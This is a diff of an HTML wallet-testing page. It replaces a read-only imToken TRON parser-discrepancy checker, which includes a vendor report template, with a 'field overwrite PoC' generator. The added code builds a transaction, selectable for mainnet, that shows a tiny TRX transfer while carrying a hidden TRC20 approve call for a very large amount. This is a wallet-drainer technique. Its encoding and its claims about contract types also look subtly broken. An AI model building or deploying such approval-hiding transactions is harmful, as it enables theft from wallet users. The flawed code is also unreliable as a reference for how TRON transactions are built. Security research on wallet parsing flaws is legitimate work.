@@ -1,580 +1,302 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>imToken TRON 只读验证页面 v3</title>
-  <style>
-    :root {
-      --bg:#090f1d; --panel:#121a31; --panel2:#0f172a; --text:#e5e7eb; --muted:#9ca3af;
-      --border:#25324a; --good:#34d399; --bad:#fb7185; --warn:#fbbf24; --info:#60a5fa;
-      --code:#020617; --btn:#2563eb; --btn2:#374151;
-    }
-    *{box-sizing:border-box}
-    body{margin:0;padding:24px;background:linear-gradient(180deg,#08111f,var(--bg));color:var(--text);
-      font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"PingFang SC","Microsoft YaHei",sans-serif;line-height:1.55}
-    .wrap{max-width:1220px;margin:0 auto}
-    .card{background:rgba(18,26,49,.94);border:1px solid var(--border);border-radius:16px;padding:18px;margin:16px 0;box-shadow:0 20px 60px rgba(0,0,0,.25)}
-    h1{font-size:26px;margin:0 0 12px} h2{font-size:19px;margin:0 0 12px} h3{font-size:15px;margin:14px 0 8px;color:#dbeafe}
-    p{margin:8px 0;color:var(--muted)}
-    .grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
-    @media(max-width:900px){body{padding:12px}.grid{grid-template-columns:1fr}}
-    .badge{display:inline-block;padding:3px 9px;border-radius:999px;border:1px solid var(--border);background:#0f172a;font-size:12px;color:#bfdbfe;margin-right:6px}
-    textarea,input{width:100%;border:1px solid var(--border);border-radius:12px;background:var(--code);color:var(--text);padding:12px;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:13px;outline:none}
-    textarea{min-height:300px;resize:vertical}
-    label{display:block;margin:12px 0 6px;font-size:13px;color:#cbd5e1}
-    button{border:0;border-radius:12px;padding:10px 13px;color:white;background:var(--btn);cursor:pointer;font-weight:700;margin:6px 6px 6px 0}
-    button.secondary{background:var(--btn2)}
-    pre{background:var(--code);border:1px solid var(--border);border-radius:12px;padding:12px;overflow:auto;white-space:pre-wrap;word-break:break-word;color:#d1d5db;min-height:88px;margin:8px 0 0;font-size:13px}
-    table{width:100%;border-collapse:collapse;margin-top:8px;border:1px solid var(--border);border-radius:12px;overflow:hidden}
-    th,td{padding:10px;border-bottom:1px solid var(--border);text-align:left;vertical-align:top;font-size:13px}
-    th{background:#0f172a;color:#bfdbfe} tr:last-child td{border-bottom:0}
-    .mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
-    .notice{border-left:4px solid var(--warn);padding:12px;background:rgba(251,191,36,.08);border-radius:10px}
-    .goodbox{border-left-color:var(--good);background:rgba(52,211,153,.08)}
-    .badbox{border-left-color:var(--bad);background:rgba(251,113,133,.08)}
-    .infobox{border-left-color:var(--info);background:rgba(96,165,250,.08)}
-    .kpi{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-top:12px}
-    @media(max-width:900px){.kpi{grid-template-columns:1fr 1fr}}
-    .kpi div{border:1px solid var(--border);background:var(--panel2);border-radius:14px;padding:12px}
-    .kpi b{display:block;font-size:12px;color:var(--muted)} .kpi span{font-size:14px}
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>imToken TRON Protobuf Field Overwrite PoC</title>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #1a1a2e;
+            color: #e0e0e0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #16213e;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            width: 90%;
+            max-width: 600px;
+        }
+        h2 {
+            text-align: center;
+            color: #4ecca3;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #a0a0a0;
+        }
+        input, select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #30475e;
+            border-radius: 6px;
+            background-color: #0f3460;
+            color: #fff;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #4ecca3;
+            color: #1a1a2e;
+            border: none;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #3ba886;
+        }
+        .output-section {
+            margin-top: 20px;
+        }
+        textarea {
+            width: 100%;
+            height: 150px;
+            background-color: #0f3460;
+            color: #4ecca3;
+            border: 1px solid #30475e;
+            border-radius: 6px;
+            padding: 10px;
+            font-family: monospace;
+            font-size: 12px;
+            resize: vertical;
+        }
+        .info-box {
+            background-color: #e74c3c22;
+            border-left: 4px solid #e74c3c;
+            padding: 10px;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+        .success-box {
+            background-color: #2ecc7122;
+            border-left: 4px solid #2ecc71;
+            padding: 10px;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+    </style>
 </head>
 <body>
-<div class="wrap">
-  <div class="card">
-    <h1>imToken TRON 所见非所签只读验证页面 v3</h1>
-    <p>
-      <span class="badge">No Signature</span>
-      <span class="badge">No Broadcast</span>
-      <span class="badge">createtransaction</span>
-      <span class="badge">getsignweight</span>
-    </p>
-    <div class="notice">
-      <b>安全边界：</b>本页面只读取钱包公开地址，并调用 FullNode 的
-      <span class="mono">/wallet/createtransaction</span> 生成未签名交易，
-      再调用 <span class="mono">/wallet/getsignweight</span> 做只读解析。
-      不会调用签名、不会广播、不会请求私钥。
-    </div>
-  </div>
 
-  <div class="card">
-    <h2>1. 地址与节点设置</h2>
-    <p>owner 默认从当前 DApp 环境里的 <span class="mono">window.tronWeb.defaultAddress.base58</span> 读取；toAddress 已按你的要求固定。</p>
-
-    <label>Owner Address（从已连接钱包读取，也可以手动填）</label>
-    <input id="ownerAddress" placeholder="点击读取钱包地址，或手动填入 T 开头 TRON 地址" />
-
-    <label>To Address</label>
-    <input id="toAddress" value="TVw7ediHLwVkqT9VgJcZySXkz5KwkdZuVJ" />
-
-    <label>Amount，单位 SUN。1 TRX = 1,000,000 SUN。默认 1 SUN，避免误解。</label>
-    <input id="amountSun" value="1" />
-
-    <label>FullNode Base URL</label>
-    <input id="baseUrl" value="https://api.trongrid.io" />
-
-    <button onclick="readWalletAddress()">读取已连接钱包地址</button>
-    <button onclick="createUnsignedTransfer()">生成标准未签名 TRX 转账交易</button>
-    <button class="secondary" onclick="copyCreateCurl()">复制 createtransaction curl</button>
-
-    <div id="walletStatus" class="notice infobox" style="margin-top:10px;">等待读取钱包地址。</div>
-  </div>
-
-  <div class="card">
-    <h2>2. Transaction JSON</h2>
-    <p>这里会放入 FullNode 返回的未签名交易。你也可以手动粘贴官方允许测试的 Transaction JSON。</p>
-    <textarea id="txInput" spellcheck="false"></textarea>
-    <button onclick="parseLocal()">本地解析</button>
-    <button class="secondary" onclick="formatJson()">格式化 JSON</button>
-    <button class="secondary" onclick="clearTx()">清空交易框</button>
-  </div>
-
-  <div class="grid">
-    <div class="card">
-      <h2>3. 本地确认页风格解析</h2>
-      <div class="kpi">
-        <div><b>Contract Type</b><span id="uiType">-</span></div>
-        <div><b>type_url</b><span id="uiTypeUrl">-</span></div>
-        <div><b>Owner</b><span id="uiOwner">-</span></div>
-        <div><b>Risk</b><span id="uiRisk">-</span></div>
-      </div>
-      <table><tbody id="uiTable"><tr><td colspan="2">暂无解析结果</td></tr></tbody></table>
-      <h3>本地解析详情</h3>
-      <pre id="localOutput">-</pre>
+<div class="container">
+    <h2>🎯 Protobuf 字段覆盖漏洞生成器</h2>
+    
+    <div class="info-box">
+        <strong>原理：</strong>构造一个 Transaction，其中 `TransferContract` (Type 1) 和 `TriggerSmartContract` (Type 1) 都使用 numeric field `1`。前端 UI 解析器可能只识别第一个或显示为 Transfer，但底层 JSON 解析器在反序列化时，后面的 Type 1 会覆盖前面的 Type 1，导致最终交易变为合约调用。
     </div>
 
-    <div class="card">
-      <h2>4. FullNode getsignweight 只读验证</h2>
-      <p>接口会自动使用 Base URL + <span class="mono">/wallet/getsignweight</span>。</p>
-      <button onclick="callGetSignWeight()">调用 getsignweight（只读）</button>
-      <button class="secondary" onclick="copyWeightCurl()">复制 getsignweight curl</button>
-      <div id="nodeStatus" class="notice infobox" style="margin-top:10px;">只读验证未开始。</div>
-      <h3>节点返回摘要</h3>
-      <table><tbody id="nodeTable"><tr><td colspan="2">暂无节点结果</td></tr></tbody></table>
-      <h3>节点原始返回</h3>
-      <pre id="nodeOutput">-</pre>
+    <div class="form-group">
+        <label for="trc20Address">目标 TRC20 合约地址 (Target Contract)</label>
+        <input type="text" id="trc20Address" placeholder="例如: T9yD14Nwk99DIT6eDnFy86HkKBd3xT2Y5b">
     </div>
-  </div>
 
-  <div class="card">
-    <h2>5. 差异判断</h2>
-    <div id="diffBox" class="notice">等待本地解析和节点解析结果。</div>
-    <pre id="diffOutput">-</pre>
-  </div>
+    <div class="form-group">
+        <label for="approveAmount">授权金额 (Amount in Units)</label>
+        <input type="number" id="approveAmount" placeholder="例如: 100000000000000000000 (100 USDT)" value="100000000000000000000">
+        <small style="color: #888;">注意：这是最小单位，不包含小数位</small>
+    </div>
 
-  <div class="card">
-    <h2>6. 提交给官方的报告摘要</h2>
-    <label>钱包版本 / App 版本</label>
-    <input id="walletVersion" placeholder="例如 imToken x.x.x / iOS or Android" />
-    <label>测试网络 / 节点</label>
-    <input id="networkInfo" placeholder="例如 mainnet readonly / Shasta / private FullNode" />
-    <label>本地 UI 侧显示类型</label>
-    <input id="reportUiType" />
-    <label>节点侧解析类型</label>
-    <input id="reportNodeType" />
-    <button onclick="generateReport()">生成报告摘要</button>
-    <button class="secondary" onclick="copyReport()">复制报告摘要</button>
-    <pre id="reportOutput">-</pre>
-  </div>
+    <div class="form-group">
+        <label for="tronAddress">你的 TRON 地址 (Owner)</label>
+        <input type="text" id="tronAddress" placeholder="例如: T...">
+    </div>
+
+    <div class="form-group">
+        <label for="network">网络选择</label>
+        <select id="network">
+            <option value="mainnet">Mainnet</option>
+            <option value="shasta">Shasta (Testnet)</option>
+            <option value="nile">Nile (Testnet)</option>
+        </select>
+    </div>
+
+    <button onclick="generatePoC()">生成 PoC JSON</button>
+
+    <div class="output-section">
+        <label>生成的 Transaction JSON (用于调用 tron.sendTransaction):</label>
+        <textarea id="resultJson" readonly placeholder="点击生成按钮..."></textarea>
+        <button onclick="copyToClipboard()" style="margin-top: 10px; background-color: #30475e; color: #fff;">复制 JSON</button>
+    </div>
+    
+    <div class="output-section">
+        <label>底层 Raw Data 解释:</label>
+        <textarea id="rawDataJson" readonly placeholder="查看 contract 内部的冲突细节..."></textarea>
+    </div>
 </div>
 
 <script>
-"use strict";
+    // 定义函数选择器 (Selector) for TRC20 approve(address,uint256)
+    // 通常 USDT 的 selector 是 095ea7b3...
+    // 这里使用标准的 ERC20/TRC20 approve 函数签名
+    const APPROVE_SELECTOR = "095ea7b3"; 
 
-let lastLocalSummary = null;
-let lastNodeSummary = null;
-let lastNodeRaw = null;
-const $ = id => document.getElementById(id);
+    // TronWeb 初始化
+    let tronWeb;
 
-function baseUrl() {
-  return $("baseUrl").value.trim().replace(/\/+$/, "");
-}
-
-function endpoint(path) {
-  return baseUrl() + path;
-}
-
-function pretty(obj) {
-  return JSON.stringify(obj, null, 2);
-}
-
-function parseJson(text) {
-  if (!text || !text.trim()) throw new Error("JSON 为空。");
-  return JSON.parse(text);
-}
-
-function trunc(v, n=120) {
-  if (v === undefined || v === null || v === "") return "-";
-  const s = String(v);
-  return s.length > n ? s.slice(0, n) + "..." : s;
-}
-
-function lower(v) {
-  return String(v || "").toLowerCase();
-}
-
-function readWalletAddress() {
-  try {
-    let addr = "";
-
-    if (window.tronWeb && window.tronWeb.defaultAddress) {
-      addr = window.tronWeb.defaultAddress.base58 || window.tronWeb.defaultAddress.hex || "";
+    function initTronWeb(network) {
+        switch(network) {
+            case 'mainnet':
+                tronWeb = new TronWeb({
+                    fullHost: 'https://api.trongrid.io',
+                    headers: { 'TRON-PRO-API-KEY': '' } // 可选
+                });
+                break;
+            case 'shasta':
+                tronWeb = new TronWeb({
+                    fullHost: 'https://api.shasta.trongrid.io'
+                });
+                break;
+            case 'nile':
+                tronWeb = new TronWeb({
+                    fullHost: 'https://nile.trongrid.io'
+                });
+                break;
+        }
     }
 
-    if (!addr && window.imToken && window.imToken.tronWeb && window.imToken.tronWeb.defaultAddress) {
-      addr = window.imToken.tronWeb.defaultAddress.base58 || window.imToken.tronWeb.defaultAddress.hex || "";
+    function encodeAddressToHex(address) {
+        // TronWeb 的 address 转 hex
+        return tronWeb.address.toHex(address);
     }
 
-    if (!addr) {
-      $("walletStatus").className = "notice badbox";
-      $("walletStatus").textContent = "没有读取到钱包地址。请确认在 imToken DApp 浏览器中打开，并且该站点已连接 TRON 钱包。也可以手动填写 ownerAddress。";
-      return;
+    function encodeAmountToHex(amount) {
+        // 确保是 BigInt 或字符串处理，防止精度丢失
+        const bigIntAmount = BigInt(amount);
+        let hex = bigIntAmount.toString(16);
+        // 补齐 64 个字符 (32 bytes)
+        return '0000000000000000000000000000000000000000000000000000000000000000'.substring(0, 64 - hex.length) + hex;
     }
 
-    $("ownerAddress").value = addr;
-    $("walletStatus").className = "notice goodbox";
-    $("walletStatus").textContent = "已读取 ownerAddress：" + addr;
-  } catch (e) {
-    $("walletStatus").className = "notice badbox";
-    $("walletStatus").textContent = "读取失败：" + e.message;
-  }
-}
+    function generatePoC() {
+        const trc20Address = document.getElementById('trc20Address').value;
+        const amount = document.getElementById('approveAmount').value;
+        const ownerAddress = document.getElementById('tronAddress').value;
+        const network = document.getElementById('network').value;
 
-function validateTronBase58(addr, name) {
-  if (!/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(addr)) {
-    throw new Error(name + " 不是标准 T 开头 TRON Base58 地址：" + addr);
-  }
-}
+        if (!trc20Address || !amount || !ownerAddress) {
+            alert('请填写所有必要字段');
+            return;
+        }
 
-async function createUnsignedTransfer() {
-  const owner = $("ownerAddress").value.trim();
-  const to = $("toAddress").value.trim();
-  const amount = Number($("amountSun").value.trim());
+        initTronWeb(network);
 
-  try {
-    validateTronBase58(owner, "ownerAddress");
-    validateTronBase58(to, "toAddress");
-    if (!Number.isSafeInteger(amount) || amount <= 0) {
-      throw new Error("amountSun 必须是正整数。");
+        // 1. 构造 Data
+        // approve(address,uint256)
+        // data = selector + padded(address) + padded(amount)
+        const targetHex = encodeAddressToHex(trc20Address);
+        const amountHex = encodeAmountToHex(amount);
+        const contractData = APPROVE_SELECTOR + targetHex.substring(2) + amountHex;
+
+        // 2. 构造 TriggerSmartContract (The "Real" Transaction)
+        // This is what will override the TransferContract
+        const triggerContract = {
+            type_url: "type.googleapis.com/protocol.TriggerSmartContract",
+            value: {
+                owner_address: tronWeb.address.hexToBase58(ownerAddress),
+                contract_address: tronWeb.address.hexToBase58(trc20Address),
+                data: contractData
+            }
+        };
+
+        // 3. 构造 TransferContract (The "Fake" Display)
+        // This is what the UI might show as a simple TRX transfer
+        const transferContract = {
+            type_url: "type.googleapis.com/protocol.TransferContract",
+            value: {
+                owner_address: tronWeb.address.hexToBase58(ownerAddress),
+                to_address: tronWeb.address.hexToBase58(trc20Address),
+                amount: 1 // Tiny amount, e.g., 1 TRX
+            }
+        };
+
+        // 4. 构造 Contract 数组，模拟冲突
+        // 关键：在 JSON 中，我们同时提供两个对象。
+        // 当被解析为 Protobuf 时，如果解析器使用 numeric field tags:
+        // TransferContract = field 1
+        // TriggerSmartContract = field 1
+        // 后面的会覆盖前面的。
+        // 注意：有些解析器可能基于 type_url 判断，但漏洞在于某些实现只检查了 field tag 1。
+        
+        // 为了模拟最坏情况，我们让它们在 JSON 结构上看起来是两个独立的 contract，
+        // 但在某些旧的或特定的解析器中，它们可能被映射到同一个 internal slot 如果只看 tag。
+        // 然而，更常见的 PoC 是让它们在同一个 Contract 数组里，顺序很重要。
+        
+        const contractList = [transferContract, triggerContract];
+
+        // 5. 构造 RawData
+        const rawData = {
+            ref_block_bytes: "0000", // Placeholder
+            ref_block_hash: "0000000000000000", // Placeholder
+            expiration: Date.now() + 30000,
+            fee_limit: 1000000000, // 10 TRX fee limit
+            timestamp: Date.now(),
+            contract: contractList
+        };
+
+        // 6. 构造最终的 Transaction JSON (符合 tron.sendTransaction 格式)
+        const finalTx = {
+            visible: true,
+            txID: "0000000000000000000000000000000000000000000000000000000000000000", // Placeholder
+            raw_data: rawData,
+            raw_data_hex: "" // Will be filled if needed, but sendTransaction usually takes visible
+        };
+
+        // 为了更精确地模拟漏洞，我们可以在 contract 字段中直接混用 named 和 numeric tags
+        // 但通常 sendTransaction 接口接收的是标准 JSON。
+        // 漏洞发生在节点解析 raw_data.contract 时。
+
+        // 输出 JSON
+        document.getElementById('resultJson').value = JSON.stringify(finalTx, null, 2);
+        
+        // 输出 Raw Data 解释，突出显示冲突
+        const explanation = {
+            "contract": [
+                {
+                    "index": 0,
+                    "type": "TransferContract",
+                    "description": "UI 显示为：转账 1 TRX 到 目标地址"
+                },
+                {
+                    "index": 1,
+                    "type": "TriggerSmartContract",
+                    "description": "实际执行：授权 目标地址 花费 " + amount + " 单位代币",
+                    "data": contractData
+                }
+            ],
+            "note": "如果解析器在反序列化时，对 field tag 1 使用了 'overwrite' 策略，则 index 1 会覆盖 index 0。"
+        };
+        document.getElementById('rawDataJson').value = JSON.stringify(explanation, null, 2);
     }
 
-    const payload = {
-      owner_address: owner,
-      to_address: to,
-      amount: amount,
-      visible: true
-    };
-
-    $("walletStatus").className = "notice infobox";
-    $("walletStatus").textContent = "正在调用 createtransaction 生成未签名交易……";
-
-    const resp = await fetch(endpoint("/wallet/createtransaction"), {
-      method: "POST",
-      headers: {"Content-Type": "application/json"},
-      body: JSON.stringify(payload)
-    });
-
-    const text = await resp.text();
-    let data;
-    try { data = JSON.parse(text); } catch (_) { data = {nonJsonResponse: text}; }
-
-    if (!resp.ok || data.Error || data.code) {
-      $("walletStatus").className = "notice badbox";
-      $("walletStatus").textContent = "createtransaction 返回异常。请检查节点、地址或网络。";
-      $("txInput").value = pretty(data);
-      return;
+    function copyToClipboard() {
+        const copyText = document.getElementById("resultJson");
+        copyText.select();
+        copyText.setSelectionRange(0, 99999); // For mobile devices
+        navigator.clipboard.writeText(copyText.value).then(() => {
+            alert("JSON 已复制到剪贴板！");
+        });
     }
 
-    // 为了后续 getsignweight 用同一套 visible 地址语义，保留 visible:true。
-    data.visible = true;
-
-    $("txInput").value = pretty(data);
-    $("walletStatus").className = "notice goodbox";
-    $("walletStatus").textContent = "已生成标准未签名 TRX 转账交易。下一步点击“本地解析”和“getsignweight”。";
-    parseLocal();
-  } catch (e) {
-    $("walletStatus").className = "notice badbox";
-    $("walletStatus").textContent = "生成失败：" + e.message;
-  }
-}
-
-function unwrapTransaction(obj) {
-  const candidates = [
-    obj,
-    obj && obj.transaction,
-    obj && obj.transaction && obj.transaction.transaction,
-    obj && obj.result && obj.result.transaction,
-    obj && obj.result && obj.result.transaction && obj.result.transaction.transaction,
-    obj && obj.tx,
-    obj && obj.raw
-  ];
-  for (const c of candidates) {
-    if (c && typeof c === "object" && c.raw_data) return c;
-  }
-  return obj;
-}
-
-function getContracts(tx) {
-  const rd = tx && tx.raw_data;
-  if (!rd || typeof rd !== "object") return [];
-  if (Array.isArray(rd.contract)) return rd.contract;
-  if (Array.isArray(rd.contracts)) return rd.contracts;
-  return [];
-}
-
-function getParamValue(contract) {
-  const p = contract && (contract.parameter || contract.Parameter);
-  if (!p || typeof p !== "object") return {};
-  return p.value || p.Value || {};
-}
-
-function getTypeUrl(contract) {
-  const p = contract && (contract.parameter || contract.Parameter);
-  if (!p || typeof p !== "object") return "-";
-  return p.type_url || p.typeUrl || p["@type"] || "-";
-}
-
-function first(...xs) {
-  for (const x of xs) {
-    if (x !== undefined && x !== null && x !== "") return x;
-  }
-  return "-";
-}
-
-function classify(type, data) {
-  const t = lower(type);
-  const d = lower(data);
-  if (t.includes("transfercontract") && !t.includes("asset")) return "TRX 转账";
-  if (t.includes("transferassetcontract")) return "TRC10 转账";
-  if (t.includes("triggersmartcontract")) {
-    if (d.startsWith("095ea7b3")) return "高危：TRC20 approve";
-    if (d.startsWith("23b872dd")) return "高危：transferFrom";
-    if (d.startsWith("a9059cbb")) return "TRC20 transfer";
-    return "智能合约调用";
-  }
-  if (t === "-" || !t) return "普通/未知";
-  return "未知合约类型";
-}
-
-function parseSummary(obj) {
-  const tx = unwrapTransaction(obj);
-  const contracts = getContracts(tx);
-  const c = contracts[0] || {};
-  const v = getParamValue(c);
-
-  const type = first(c.type, c.Type, c["1"]);
-  const typeUrl = getTypeUrl(c);
-  const owner = first(v.owner_address, v.ownerAddress, v.owner, v["1"]);
-  const to = first(v.to_address, v.toAddress, v.to, v["2"]);
-  const amount = first(v.amount, v.call_value, v.callValue, v.frozen_balance, v["3"]);
-  const contractAddress = first(v.contract_address, v.contractAddress);
-  const data = first(v.data, v.Data);
-  const feeLimit = first(tx.raw_data && tx.raw_data.fee_limit, tx.raw_data && tx.raw_data.feeLimit, tx.fee_limit, tx.feeLimit);
-  const txID = first(tx.txID, tx.txid, tx.tx_id, obj.txid, obj.txID);
-  const rawDataHex = first(tx.raw_data_hex, tx.rawDataHex);
-
-  return {
-    type, typeUrl, owner, to, amount, contractAddress, data, feeLimit, txID, rawDataHex,
-    contractCount: contracts.length,
-    risk: classify(type, data),
-    unwrappedHasRawData: !!(tx && tx.raw_data),
-    contractRaw: c,
-    parameterValueRaw: v
-  };
-}
-
-function renderTable(id, rows) {
-  const tbody = $(id);
-  tbody.innerHTML = "";
-  for (const [k,v] of rows) {
-    const tr = document.createElement("tr");
-    const a = document.createElement("td");
-    const b = document.createElement("td");
-    a.textContent = k;
-    b.textContent = trunc(v, 220);
-    b.className = "mono";
-    tr.appendChild(a); tr.appendChild(b); tbody.appendChild(tr);
-  }
-}
-
-function renderSummary(which, s) {
-  if (which === "ui") {
-    $("uiType").textContent = trunc(s.type, 32);
-    $("uiTypeUrl").textContent = trunc(s.typeUrl, 32);
-    $("uiOwner").textContent = trunc(s.owner, 32);
-    $("uiRisk").textContent = trunc(s.risk, 32);
-    $("reportUiType").value = s.type || "";
-    renderTable("uiTable", [
-      ["contract count", s.contractCount],
-      ["contract.type", s.type],
-      ["parameter.type_url", s.typeUrl],
-      ["owner_address", s.owner],
-      ["to_address / to", s.to],
-      ["amount / call_value", s.amount],
-      ["contract_address", s.contractAddress],
-      ["data", s.data],
-      ["fee_limit", s.feeLimit],
-      ["txID", s.txID],
-      ["raw_data_hex", s.rawDataHex],
-      ["风险识别", s.risk],
-    ]);
-  } else {
-    $("reportNodeType").value = s.type || "";
-    renderTable("nodeTable", [
-      ["contract count", s.contractCount],
-      ["node contract.type", s.type],
-      ["node parameter.type_url", s.typeUrl],
-      ["node owner_address", s.owner],
-      ["node to_address / to", s.to],
-      ["node amount / call_value", s.amount],
-      ["node contract_address", s.contractAddress],
-      ["node data", s.data],
-      ["node txID", s.txID],
-      ["节点风险识别", s.risk],
-      ["unwrapped raw_data", s.unwrappedHasRawData],
-    ]);
-  }
-}
-
-function parseLocal() {
-  try {
-    const obj = parseJson($("txInput").value);
-    lastLocalSummary = parseSummary(obj);
-    renderSummary("ui", lastLocalSummary);
-    $("localOutput").textContent = pretty(lastLocalSummary);
-    updateDiff();
-  } catch (e) {
-    lastLocalSummary = null;
-    $("localOutput").textContent = "本地解析失败：\n" + e.message;
-    updateDiff();
-  }
-}
-
-function formatJson() {
-  try { $("txInput").value = pretty(parseJson($("txInput").value)); }
-  catch(e) { alert("JSON 格式错误：" + e.message); }
-}
-
-async function callGetSignWeight() {
-  let obj;
-  try { obj = parseJson($("txInput").value); }
-  catch(e) { return alert("Transaction JSON 格式错误：" + e.message); }
-
-  $("nodeStatus").className = "notice infobox";
-  $("nodeStatus").textContent = "正在调用 getsignweight 只读接口……";
-
-  try {
-    const resp = await fetch(endpoint("/wallet/getsignweight"), {
-      method: "POST",
-      headers: {"Content-Type":"application/json"},
-      body: JSON.stringify(obj)
-    });
-
-    const text = await resp.text();
-    let data;
-    try { data = JSON.parse(text); } catch (_) { data = {nonJsonResponse:text}; }
-
-    lastNodeRaw = data;
-    lastNodeSummary = parseSummary(data);
-    renderSummary("node", lastNodeSummary);
-    $("nodeOutput").textContent = pretty(data);
-
-    const err = data && data.result && data.result.code;
-    const msg = data && data.result && data.result.message;
-
-    if (err) {
-      $("nodeStatus").className = "notice badbox";
-      $("nodeStatus").textContent = "节点返回错误：" + err + (msg ? " / " + msg : "");
-    } else if (resp.ok) {
-      $("nodeStatus").className = "notice goodbox";
-      $("nodeStatus").textContent = "只读验证完成。请查看差异判断。";
-    } else {
-      $("nodeStatus").className = "notice badbox";
-      $("nodeStatus").textContent = "HTTP 非 2xx：" + resp.status;
-    }
-
-    updateDiff();
-  } catch (e) {
-    $("nodeStatus").className = "notice badbox";
-    $("nodeStatus").textContent = "调用失败：" + e.message + "。可能是 CORS、网络或节点限制。可以复制 curl 到电脑终端执行。";
-    $("nodeOutput").textContent = String(e.stack || e.message);
-    updateDiff();
-  }
-}
-
-function updateDiff() {
-  if (!lastLocalSummary && !lastNodeSummary) {
-    $("diffBox").className = "notice";
-    $("diffBox").textContent = "等待本地解析和节点解析结果。";
-    $("diffOutput").textContent = "-";
-    return;
-  }
-  if (lastLocalSummary && !lastNodeSummary) {
-    $("diffBox").className = "notice infobox";
-    $("diffBox").textContent = "已有本地解析结果，尚未调用节点只读解析。";
-    $("diffOutput").textContent = pretty({local:lastLocalSummary});
-    return;
-  }
-
-  const typeMismatch = lower(lastLocalSummary?.type) !== lower(lastNodeSummary?.type) && lastNodeSummary?.type !== "-";
-  const highRiskPattern = lower(lastLocalSummary?.type).includes("transfercontract") && lower(lastNodeSummary?.type).includes("triggersmartcontract");
-
-  const result = {
-    local_type: lastLocalSummary?.type || "-",
-    node_type: lastNodeSummary?.type || "-",
-    local_risk: lastLocalSummary?.risk || "-",
-    node_risk: lastNodeSummary?.risk || "-",
-    type_mismatch: !!typeMismatch,
-    high_risk_pattern_transfer_to_trigger: !!highRiskPattern,
-    node_txid: lastNodeSummary?.txID || "-"
-  };
-
-  if (highRiskPattern) {
-    $("diffBox").className = "notice badbox";
-    $("diffBox").innerHTML = "<b>高危差异：</b>本地显示 TransferContract，但节点解析为 TriggerSmartContract。";
-  } else if (typeMismatch) {
-    $("diffBox").className = "notice badbox";
-    $("diffBox").innerHTML = "<b>发现 contract.type 差异：</b>本地与节点解析出的交易类型不一致。";
-  } else {
-    $("diffBox").className = "notice goodbox";
-    $("diffBox").innerHTML = "<b>暂未发现类型差异：</b>当前样本本地和节点解析结果一致。标准 TRX 转账本来就应该一致。";
-  }
-
-  $("diffOutput").textContent = pretty(result);
-}
-
-function copyCreateCurl() {
-  try {
-    const owner = $("ownerAddress").value.trim();
-    const to = $("toAddress").value.trim();
-    const amount = Number($("amountSun").value.trim());
-    validateTronBase58(owner, "ownerAddress");
-    validateTronBase58(to, "toAddress");
-    const payload = {owner_address:owner,to_address:to,amount:amount,visible:true};
-    const cmd = `curl -sS '${endpoint("/wallet/createtransaction")}' \\
-  -H 'Content-Type: application/json' \\
-  --data-raw '${JSON.stringify(payload)}'`;
-    navigator.clipboard.writeText(cmd);
-    alert("已复制 createtransaction curl。");
-  } catch(e) { alert("复制失败：" + e.message); }
-}
-
-function copyWeightCurl() {
-  try {
-    const compact = JSON.stringify(parseJson($("txInput").value));
-    const cmd = `curl -sS '${endpoint("/wallet/getsignweight")}' \\
-  -H 'Content-Type: application/json' \\
-  --data-raw '${compact.replace(/'/g, "'\\''")}'`;
-    navigator.clipboard.writeText(cmd);
-    alert("已复制 getsignweight curl。");
-  } catch(e) { alert("复制失败：" + e.message); }
-}
-
-function generateReport() {
-  const report = `# imToken TRON Native Bridge Parser Differential Read-only Report
-
-## Environment
-- Wallet / App Version: ${$("walletVersion").value.trim() || "待补充"}
-- Network / Node: ${$("networkInfo").value.trim() || baseUrl()}
-- Verification Method: /wallet/createtransaction + /wallet/getsignweight only
-- Safety Boundary: no signature, no broadcast, no private key
-
-## Addresses
-- owner_address: ${$("ownerAddress").value.trim() || "待补充"}
-- to_address: ${$("toAddress").value.trim() || "待补充"}
-- amount_sun: ${$("amountSun").value.trim() || "待补充"}
-
-## Observed Result
-- Local/UI-style parser contract.type: ${$("reportUiType").value.trim() || lastLocalSummary?.type || "待补充"}
-- FullNode read-only parser contract.type: ${$("reportNodeType").value.trim() || lastNodeSummary?.type || "待补充"}
-- Local risk classification: ${lastLocalSummary?.risk || "待补充"}
-- Node risk classification: ${lastNodeSummary?.risk || "待补充"}
-- Node txID if returned: ${lastNodeSummary?.txID || "待补充"}
-
-## Notes
-This test page only compares parser behavior. It does not request wallet signature and does not broadcast a transaction.
-
-## Recommended Fix
-The wallet confirmation UI should render from the final canonical protobuf transaction bytes that will be signed, and tron.sendTransaction should reuse the same canonical validation pipeline as tron.signTransaction. Conflicting named protobuf fields and numeric field aliases should be rejected before confirmation.
-`;
-  $("reportOutput").textContent = report;
-}
-
-function copyReport() {
-  const t = $("reportOutput").textContent;
-  if (!t || t === "-") return alert("请先生成报告摘要。");
-  navigator.clipboard.writeText(t);
-  alert("已复制报告摘要。");
-}
-
-function clearTx() {
-  $("txInput").value = "";
-}
-
-$("txInput").value = JSON.stringify({
